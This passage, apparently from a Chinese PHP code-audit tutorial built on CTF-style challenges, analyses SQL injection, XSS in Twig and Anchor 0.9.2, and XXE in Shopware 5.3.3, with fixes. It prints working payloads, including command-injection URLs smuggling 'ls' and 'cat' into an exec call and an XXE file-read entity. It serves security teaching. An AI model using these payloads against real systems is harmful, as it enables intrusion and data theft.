中存在特殊字符或字母时，会出现报错，报错信息为特殊字符、字母及之后的内容，也就是说如果我们想要查询的数据是数字开头，例如 7701HongRi ，那么查询结果只会显示 HongRi 。所以我们会看到很多 updatexml 注入的 payload 是长这样的 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) ,在所要查询的数据前面凭借一个特殊符号(这里的 0x7e 为符号 ‘<del>‘ )。使用下面的payload可以获得题解：<br>&#96;<a href="http://localhost/index.php?id=4">http://localhost/index.php?id=4</a> and (select updatexml(1,make_set(3,’</del>‘,(select flag from flag)),1))&#96;</p><h2 id="Twig-过滤不充分"><a href="#Twig-过滤不充分" class="headerlink" title="Twig 过滤不充分"></a>Twig 过滤不充分</h2><p>题目叫做Twig，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-5.png"><br><strong>漏洞解析</strong> ：<br>这一关题目实际上用的是PHP的一个模板引擎 <a href="https://twig.symfony.com/">Twig</a> ，本题考察XSS(跨站脚本攻击)漏洞。虽然题目代码分别用了 <strong>escape</strong> 和 <strong>filter_var</strong> 两个过滤方法，但是还是可以被攻击者绕过。在上图 <strong>第8行</strong> 中，程序使用 <a href="https://twig.symfony.com/">Twig</a> 模板引擎定义的 <strong>escape</strong> 过滤器来过滤link，而实际上这里的 <strong>escape</strong> 过滤器，是用PHP内置函数 <strong>htmlspecialchars</strong> 来实现的，具体可以点击 <a href="https://twig.symfony.com/doc/2.x/filters/escape.html">这里</a> 了解 <strong>escape</strong> 过滤器， <strong>htmlspecialchars</strong> 函数定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.htmlspecialchars.php"> <strong>htmlspecialchars</strong> </a> ：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：将特殊字符转换为 HTML 实体</p><p><strong>定义</strong> ：string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> &#x3D; ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> &#x3D; ini_get(“default_charset”) [, bool <code>$double_encode</code> &#x3D; <strong>TRUE</strong> ]]] )</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; 符号)  ===============  &amp;amp;</span><br><span class="line"><span class="string">&quot; (双引号)  ===============  &amp;quot;</span></span><br><span class="line"><span class="string">&#x27; (单引号)  ===============  &amp;apos;</span></span><br><span class="line"><span class="string">&lt; (小于号)  ===============  &amp;lt;</span></span><br><span class="line"><span class="string">&gt; (大于号)  ===============  &amp;gt;</span></span><br></pre></td></tr></table></figure><p>第二处过滤在 <strong>第17行</strong> ，这里用了 <strong>filter_var</strong> 函数来过滤 <strong>nextSlide</strong> 变量，且用了 <strong>FILTER_VALIDATE_URL</strong> 过滤器来判断是否是一个合法的url，具体的 <strong>filter_var</strong> 定义如下：<br><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>： (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p><p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )<br><strong>函数原型</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">mixed</span> <span class="title function_ invoke__">filter_var</span> ( <span class="keyword">mixed</span> <span class="variable">$variable</span> [, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT [, <span class="keyword">mixed</span> <span class="variable">$options</span> ]] )</span><br></pre></td></tr></table></figure><ul><li><strong>$variable</strong>: 要过滤的变量。</li><li><strong>$filter</strong>: 用于过滤的过滤器 ID。如果不提供，默认为 <code>FILTER_DEFAULT</code>。</li><li><strong>$options</strong>: 一个关联数组或单一的标志，指定额外的过滤器选项和标志。<br>常用的过滤器选项<br>PHP 提供了多种过滤器，可以分为两类：验证过滤器和清理过滤器。验证过滤器用于验证数据格式，如果数据无效，则返回 <code>false</code>；清理过滤器用于清理数据，如去除非法字符等。<br>验证过滤器</li><li><strong>FILTER_VALIDATE_BOOLEAN</strong>: 验证布尔值。</li><li><strong>FILTER_VALIDATE_EMAIL</strong>: 验证电子邮件地址。</li><li><strong>FILTER_VALIDATE_FLOAT</strong>: 验证浮点数。</li><li><strong>FILTER_VALIDATE_INT</strong>: 验证整数。</li><li><strong>FILTER_VALIDATE_IP</strong>: 验证 IP 地址。</li><li><strong>FILTER_VALIDATE_URL</strong>: 验证 URL。</li></ul><p>清理过滤器</p><ul><li><strong>FILTER_SANITIZE_EMAIL</strong>: 清理电子邮件地址（去除所有除字母、数字以及<code>!#$%&amp;&#39;*+-/=?^_</code>{|}~@.[]&#96;之外的字符）。</li><li><strong>FILTER_SANITIZE_NUMBER_INT</strong>: 清理整数（去除所有除数字、加号、减号之外的字符）。</li><li><strong>FILTER_SANITIZE_SPECIAL_CHARS</strong>: 将特殊字符转换为 HTML 实体。</li><li><strong>FILTER_SANITIZE_STRING</strong>: 去除标签并去除或编码特殊字符。</li></ul><p>验证电子邮件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is not a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>清理字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$string</span> = <span class="string">&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$sanitized_string</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$string</span>, FILTER_SANITIZE_STRING);</span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="variable">$sanitized_string</span>; <span class="comment">// 输出: Hello, World!</span></span><br></pre></td></tr></table></figure><p>使用选项和标志<br><code>filter_var()</code> 还可以使用第三个参数 <code>$options</code> 来提供额外的指令，比如在验证整数时设置最小和最大值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;options&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&quot;min_range&quot;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">       <span class="string">&quot;max_range&quot;</span> =&gt; <span class="number">100</span></span><br><span class="line">   )</span><br><span class="line">&gt;);</span><br><span class="line">&gt;<span class="variable">$number</span> = <span class="number">50</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$number</span>, FILTER_VALIDATE_INT, <span class="variable">$options</span>)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is not within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>针对这两处的过滤，我们可以考虑使用 <strong>javascript伪协议</strong> 来绕过。为了让大家更好理解，请看下面的demo代码：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-6.png"></p><p>我们使用 <strong>payload</strong> ：<code>?nextSlide=javascript://comment％250aalert(1)</code> ，可以执行 <strong>alert</strong> 函数：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-7.png"><br>实际上，这里的 <strong>&#x2F;&#x2F;</strong> 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 <strong>alert</strong> 函数呢？那是因为我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行，就能执行。当然，这里我们要对 <strong>%</strong> 百分号编码成 <strong>%25</strong> ，因为程序将浏览器发来的payload：<code>javascript://comment％250aalert(1)</code> 先解码成： <code>javascript://comment%0aalert(1)</code> 存储在变量 <strong>$url</strong> 中（上图第二行代码），然后用户点击a标签链接就会触发 <strong>alert</strong> 函数。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>Anchor 0.9.2</strong> 版本，在该版本中，当用户访问一个不存在的URL链接时，程序会调用404模板，而这个模板则存在XSS漏洞，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-8.png"><br>该代码在 <strong>themes\default\404.php</strong> 中，看第4行 <strong>code</strong> 标签中的 <strong>current_url</strong> 函数，我们可在 <strong>anchor\functions\helpers.php</strong> 文件中，看到 <strong>current_url</strong> 函数是由 <strong>Uri</strong> 类的  <strong>current</strong> 方法实现的，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_url</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Uri</span>::<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进到 <strong>Uri</strong> 类，在 <strong>system\uri.php</strong> 文件中，我们发现这里调用了 <strong>static::detect</strong> 方法( <strong>statci::</strong> 是在PHP5.3版本之后引入的延迟静态绑定写法)。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-9.png"></p><p>在 <strong>current</strong> 方法下面，我们就可以找到 <strong>detect</strong> 方法，该方法会获取 <strong>$_SERVER</strong> 数组中的 <strong>‘REQUEST_URI’ 、’PATH_INFO’, 、’ORIG_PATH_INFO’</strong> 三个键的值(下图第3-4行代码)，如果存在其中的某一个键，并且符合 <strong>filter_var($uri, FILTER_SANITIZE_URL)</strong> 和 <strong>parse_url($uri, PHP_URL_PATH)</strong> ，则直接将 <strong>$uri</strong> 传入 <strong>static::format</strong> 方法，下图第10-14行代码，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-10.png"><br>我们跟进 <strong>static::format</strong> 方法，可以发现程序过滤了三次(下图第3-7行)，但是都没有针对XSS攻击进行过滤，只是为了获取用户访问的文件名，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-11.png"><br>由于没有针对XSS攻击进行过滤，导致攻击十分容易，我们来看看XSS攻击具体是如何进行的。<br><strong>漏洞利用</strong><br>我们构造payload如下：  <code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> 。根据上面的分析，当我们访问这个并不存在的链接时，程序会调用404模板页面，然后调用 <strong>current_url</strong> 函数来获取当前用户访问的文件名，也就是最后一个 <strong>&#x2F;</strong> 符号后面的内容，所以最终payload里的 <code>&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> 部分会嵌入到 <code>&lt;code&gt;</code> 标签中，造成XSS攻击<br><strong>修复建议</strong><br>这对XSS漏洞，我们最好就是过滤关键词，将特殊字符进行HTML实体编码替换，这里给出的修复代码为Dedecms中防御XSS的方法，可以在 <strong>uploads&#x2F;include&#x2F;helpers&#x2F;filter.helper.php</strong> 路径下找到对应代码，具体防护代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-12.png"></p><h3 id="作业题目-1"><a href="#作业题目-1" class="headerlink" title="作业题目"></a>作业题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; <span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出来只需要绕过两个部分，第一个是 filter_var 的过滤，第二个是 preg_match 对 url 的判断，是否是以sec-redclub.com结尾。对于filter_var可以用下面的方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=http://demo.com@sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com?sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com/sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br><span class="line">http://localhost/index.php?url=http://demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure><p>接着要绕过 parse_url 函数，并且满足 <code>$site_info[&#39;host&#39;]</code> 的值以 sec-redclub.com 结尾，payload如下：<br><code>http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-13.png"><br>当我们直接用 cat f1agi3hEre.php 命令的时候，过不了 filter_var 函数检测，因为包含空格，具体payload如下：<br><code>http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code><br>所以我们可以换成 <code>cat&lt;f1agi3hEre.php</code>命令，即可成功获取flag。</p><h2 id="Snow-Flake"><a href="#Snow-Flake" class="headerlink" title="Snow Flake"></a>Snow Flake</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-14.png"><br><strong>漏洞解析</strong> ：<br>这段代码中存在两个安全漏洞。第一个是文件包含漏洞，上图第8行中使用了 <strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 <strong>路径穿越</strong> 来包含任意文件，当然使用路径穿越符号的前提是 <strong>PHP5~5.3(包含5.3版本)版本</strong> 之间才可以。例如类名为： <strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</strong> 的查找，将查看passwd文件内容，我们来看一下PHP手册对 <strong>class_exists()</strong> 函数的定义：</p><blockquote><p><a href="http://php.net/manual/zh/function.class-exists.php"> class_exists </a> ：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：检查类是否已定义</p><p><strong>定义</strong> ： <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code> </p><p><strong>$class_name</strong> 为类的名字，在匹配的时候不区分大小写。默认情况下 <strong>$autoload</strong> 为 <strong>true</strong> ，当 <strong>$autoload</strong> 为 <strong>true</strong> 时，会自动加载本程序中的 <strong>__autoload</strong> 函数；当 <strong>$autoload</strong> 为 <strong>false</strong> 时，则不调用 <strong>__autoload</strong> 函数。</p></blockquote><p>我们再来说说第二个漏洞。在上图第9行中，我们发现实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 <strong>SimpleXMLElement</strong> 类的定义：</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p><p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p></blockquote><p>关于 <strong>SimpleXMLElement</strong> 导致的XXE攻击，下面再给出一个demo案例，方便大家理解：</p><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-15.png"></p><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>Shopware 5.3.3</strong> 版本，对 <strong>SimpleXMLElement</strong> 类导致的 <strong>XXE漏洞</strong> 进行分析，而 <strong>class_exists()</strong> 函数，我们将会在本次给出的CTF题目中深入讨论。我们来看一下本次漏洞的文件，在 <strong>engine\Shopware\Controllers\Backend\ProductStream.php</strong> 文件中有一个 <strong>loadPreviewAction</strong> 方法，其作用是用来预览产品流的详细信息，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-16.png"><br>该方法接收从用户传来的参数 <strong>sort</strong> ，然后传入 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法（如上图第11-14行代码），我们跟进 <strong>Repository</strong> 类，查看 <strong>unserialize</strong> 方法的实现。该方法我们可以在 <strong>engine\Shopware\Components\ProductStream\Repository.php</strong> 文件中找到，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-17.png"><br>可以看到 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法，调用的是 <strong>LogawareReflectionHelper</strong> 类的 <strong>unserialize</strong> 方法（如上图第5行代码），该方法我们可以在 <strong>engine\Shopware\Components\LogawareReflectionHelper.php</strong> 文件中找到，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-18.png"><br>这里的 <strong>$serialized</strong> 就是我们刚刚传入的 <strong>sort</strong> （上图第3行），程序分别从 <strong>sort</strong> 中提取出值赋给 <strong>$className</strong> 和 <strong>$arguments</strong> 变量，然后这两个变量被传入 <strong>ReflectionHelper</strong> 类的 <strong>createInstanceFromNamedArguments</strong> 方法。该方法位于 <strong>engine\Shopware\Components\ReflectionHelper.php</strong> 文件，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-19.png"><br>这里我们关注 <strong>第6行</strong> 代码，这里创建了一个反射类，而类的名称就是从 <strong>$sort</strong> 变量来的，可被用户控制利用。继续往下看，在代码第28行处用 <strong>$newParams</strong> 作为参数，创建一个新的实例对象。而这里的  <strong>$newParams</strong> 是从 <strong>$arguments[$paramName]</strong> 中取值的， <strong>$arguments</strong> 又是我们可以控制的，因为也是从 <strong>$sort</strong> 变量来，所以我们可以通过这里来实例化一个 <strong>SimpleXMLElement</strong> 类对象，形成一个XXE漏洞。下面，我们来看看具体如何利用这个漏洞。</p><p><strong>漏洞利用</strong><br>首先，我们需要登录后台，找到调用 <strong>loadPreviewAction</strong> 接口的位置，发现其调用位置如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-20.png"><br>当我们点击 <strong>Refresh preview</strong> 按钮时，就会调用 <strong>loadPreviewAction</strong> 方法，用BurpSuite抓到包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shopware520/backend/ProductStream/loadPreview?_dc=1530963660916&amp;sort=&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;&amp;conditions=&#123;&#125;&amp;shopId=1&amp;currencyId=1&amp;customerGroupKey=EK&amp;page=1&amp;start=0&amp;limit=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">X-CSRF-Token</span><span class="punctuation">: </span>IKiwilE7pecuIUmEAJigyg6fVXY6vR</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/shopware520/backend/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SHOPWAREBACKEND=78ghtddjn8n8efpv1cudj6eao0; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; goods[cart]=180615151154565652; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>我们可以看到 <strong>sort</strong> 值为 <code>&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;</code> ,于是我们按照其格式构造payload： <code>&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</code> ，关于payload的含义，可以看看 <strong>SimpleXMLElement</strong> 类的 <strong>__construct</strong> 函数定义，具体点 <a href="http://php.net/manual/zh/simplexmlelement.construct.php">这里</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span> [, <span class="keyword">bool</span> <span class="variable">$data_is_url</span> = <span class="literal">FALSE</span> [, <span class="keyword">string</span> <span class="variable">$ns</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">bool</span> <span class="variable">$is_prefix</span> = <span class="literal">FALSE</span> ]]]] )</span><br></pre></td></tr></table></figure><p>笔者所用的xxe.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/phpStudy/PHPTutorial/WWW/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们发送payload，并用xdebug调试程序，最后程序将我们读取的值存储在 <strong>$conditions</strong> 变量中，如下图所示：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-21.png"><br>关于PHP中XXE漏洞的修复，我们可以过滤关键词，如： <strong>ENTITY</strong> 、 <strong>SYSTEM</strong> 等，另外，我们还可以通过禁止加载XML实体对象的方式，来防止XXE漏洞（如下图第2行代码），具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-22.png"><br>我感觉上面实例的利用关键点在于，类的初始化和参数的传递都是我们可控的。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span 